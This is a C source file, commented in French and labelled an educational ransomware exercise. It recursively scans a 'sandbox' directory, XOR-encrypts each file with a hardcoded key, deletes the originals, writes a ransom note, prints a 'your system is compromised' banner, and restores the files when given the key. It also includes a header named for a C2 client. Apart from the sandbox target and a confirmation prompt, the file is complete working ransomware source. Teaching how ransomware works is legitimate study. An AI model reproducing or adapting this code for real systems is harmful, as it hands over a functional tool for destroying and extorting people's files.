/* * RANSOMWARE ÉDUCATIF - VERSION FINALE
 * * Ce programme simule le comportement d'un ransomware réel :
 * 1. Parcours récursif
 * 2. Chiffrement de masse
 * 3. Demande de rançon
 * 4. Déchiffrement sous condition
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Inclusion des modules existants
#include "scanner.h"
#include "xor_crypto.h"
#include "checksum.h"
#include "config.h"
#include "c2_client.h" 

// ============================================================================
// CONFIGURATION DU MALWARE
// ============================================================================
#define RANSOM_KEY "MALWARE2026"          // Clé de chiffrement (Hardcoded)
#define ENCRYPTED_EXTENSION ".locked"     // Extension des fichiers chiffrés
#define RANSOM_NOTE "RANSOM_NOTE.txt"     // Nom de la note de rançon
#define TARGET_DIR "sandbox"              // Dossier cible

// Couleurs pour le terminal
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

// ============================================================================
// PROTOTYPES
// ============================================================================
void create_ransom_note();
void print_banner();
void encrypt_all_files();
void decrypt_all_files();

// ============================================================================
// FONCTIONS UTILITAIRES & LOGIQUE
// ============================================================================

void print_banner() {
    printf("\n");
    printf(RED);
    printf("╔═══════════════════════════════════════════════════════╗\n");
    printf("║                                                       ║\n");
    printf("║            VOTRE SYSTÈME A ÉTÉ COMPROMIS !            ║\n");
    printf("║                                                       ║\n");
    printf("║          Tous vos fichiers ont été chiffrés !         ║\n");
    printf("║                                                       ║\n");
    printf("╚═══════════════════════════════════════════════════════╝\n");
    printf(RESET);
}

void create_ransom_note() {
    char note_path[MAX_PATH];
    snprintf(note_path, sizeof(note_path), "%s/%s", TARGET_DIR, RANSOM_NOTE);

    FILE *f = fopen(note_path, "w");
    if (!f) return;

    fprintf(f, "═══════════════════════════════════════════════════════\n");
    fprintf(f, "          ⚠️  AVERTISSEMENT DE SÉCURITÉ ⚠️\n");
    fprintf(f, "═══════════════════════════════════════════════════════\n\n");
    fprintf(f, "TOUS VOS FICHIERS ONT ÉTÉ CHIFFRÉS !\n\n");
    fprintf(f, "🔐 Algorithme : XOR avec clé secrète\n");
    fprintf(f, "📅 Date : Aujourd'hui\n\n");
    fprintf(f, "Pour déchiffrer vos fichiers :\n");
    fprintf(f, "./ransomware_complet decrypt\n\n");
    fprintf(f, "⚠️  CECI EST UN TP ÉDUCATIF ⚠️\n");
    fprintf(f, "Clé de déchiffrement : %s\n", RANSOM_KEY);

    fclose(f);
    printf(YELLOW "[+] Note de rançon générée : %s\n" RESET, note_path);
}

// ============================================================================
// CHIFFREMENT DE MASSE
// ============================================================================
void encrypt_all_files() {
    printf(CYAN "[*] Démarrage du chiffrement dans '%s'...\n" RESET, TARGET_DIR);

    // 1. Allocation mémoire pour la liste des fichiers
    char (*files)[MAX_PATH] = malloc(MAX_FILES * sizeof(*files));
    if (!files) {
        perror("Erreur allocation mémoire");
        return;
    }

    // 2. Scan récursif
    int count = scan_recursive(TARGET_DIR, files, MAX_FILES, 0);
    int success_count = 0;

    printf("[*] %d fichiers trouvés.\n", count);

    for (int i = 0; i < count; i++) {
        char *filename = files[i];

        // a. Ignorer la note de rançon et les fichiers déjà chiffrés
        if (strstr(filename, RANSOM_NOTE) || strstr(filename, ENCRYPTED_EXTENSION)) {
            continue;
        }

        // b. Calculer checksum (simulation d'analyse)
        uint32_t crc = calculate_crc32(filename);
        printf(" -> Chiffrement : %s (CRC32: %08X)\n", filename, crc);

        // c. Créer le nom de sortie (fichier.txt -> fichier.txt.locked)
        char output_name[MAX_PATH];
        snprintf(output_name, sizeof(output_name), "%s%s", filename, ENCRYPTED_EXTENSION);

        // d. Chiffrer
        if (xor_encrypt_file(filename, output_name, RANSOM_KEY) == 0) {
            // e. Supprimer l'original seulement si le chiffrement a réussi
            if (remove(filename) == 0) {
                success_count++;
            } else {
                perror("Erreur suppression original");
            }
        } else {
            printf(RED "Erreur chiffrement : %s\n" RESET, filename);
        }
    }

    free(files);

    // 3. Générer la note de rançon
    create_ransom_note();

    // 4. Afficher le message final
    print_banner();
    printf(RED "\n%d fichiers ont été verrouillés.\n" RESET, success_count);
}

// ============================================================================
// DÉCHIFFREMENT DE MASSE
// ============================================================================
void decrypt_all_files() {
    char input_key[128];

    // 2. Demander la clé
    printf(YELLOW "Entrez la clé de déchiffrement : " RESET);
    scanf("%127s", input_key);

    // 3. Vérifier la clé
    if (strcmp(input_key, RANSOM_KEY) != 0) {
        printf(RED "❌ Clé incorrecte ! Accès refusé.\n" RESET);
        return;
    }

    printf(GREEN "✓ Clé valide. Démarrage du déchiffrement...\n" RESET);

    char (*files)[MAX_PATH] = malloc(MAX_FILES * sizeof(*files));
    if (!files) return;

    // 1. Scanner pour trouver les .locked
    int count = scan_recursive(TARGET_DIR, files, MAX_FILES, 0);
    int recovered_count = 0;

    for (int i = 0; i < count; i++) {
        char *filename = files[i];

        // Ne traiter que les fichiers qui finissent par .locked
        char *ext = strstr(filename, ENCRYPTED_EXTENSION);
        if (ext && strcmp(ext, ENCRYPTED_EXTENSION) == 0) {
            
            // a. Construire le nom original (supprimer .locked)
            char original_name[MAX_PATH];
            size_t len = strlen(filename) - strlen(ENCRYPTED_EXTENSION);
            strncpy(original_name, filename, len);
            original_name[len] = '\0';

            // b. Déchiffrer
            if (xor_decrypt_file(filename, original_name, RANSOM_KEY) == 0) {
                // c. Supprimer le fichier .locked
                remove(filename);
                printf(" -> Restauré : %s\n", original_name);
                recovered_count++;
            }
        }
    }

    free(files);

    // 5. Supprimer la note de rançon
    char note_path[MAX_PATH];
    snprintf(note_path, sizeof(note_path), "%s/%s", TARGET_DIR, RANSOM_NOTE);
    remove(note_path);

    printf(GREEN "\nSUCCÈS : %d fichiers récupérés.\n" RESET, recovered_count);
}

// ============================================================================
// MAIN
// ============================================================================
int main(int argc, char *argv[]) {
    // Vérification des arguments
    if (argc < 2) {
        printf("UTILISATION:\n");
        printf("  %s encrypt  - Chiffrer tous les fichiers de '%s'\n", argv[0], TARGET_DIR);
        printf("  %s decrypt  - Déchiffrer tous les fichiers\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "encrypt") == 0) {
        // Demander confirmation pour éviter les accidents
        printf(RED "⚠️  ATTENTION : Vous allez chiffrer le dossier '%s'.\n", TARGET_DIR);
        printf("Ceci rendra les fichiers illisibles sans la clé.\n" RESET);
        printf("Confirmer ? (o/N): ");
        
        char confirm;
        scanf(" %c", &confirm);
        if (confirm == 'o' || confirm == 'O') {
            encrypt_all_files();
        } else {
            printf("Opération annulée.\n");
        }
    } 
    else if (strcmp(argv[1], "decrypt") == 0) {
        decrypt_all_files();
    } 
    else {
        printf("Commande inconnue: %s\n", argv[1]);
        return 1;
    }

    return 0;
}